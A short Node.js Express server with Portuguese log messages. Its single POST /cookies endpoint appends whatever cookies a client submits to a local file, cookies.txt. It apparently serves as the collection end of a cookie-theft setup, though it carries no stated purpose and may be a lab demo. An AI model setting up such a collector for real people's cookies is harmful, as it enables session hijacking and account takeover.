const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');

const app = express();
app.use(bodyParser.json());

app.post('/cookies', (req, res) => {
    const cookies = req.body.cookies;
    fs.appendFile('cookies.txt', cookies + '\n', (err) => {
        if (err) throw err;
        console.log('Cookies salvos com sucesso!');
    });
    res.sendStatus(200);
});

app.listen(3000, () => {
    console.log('Servidor rodando na porta 3000');
});
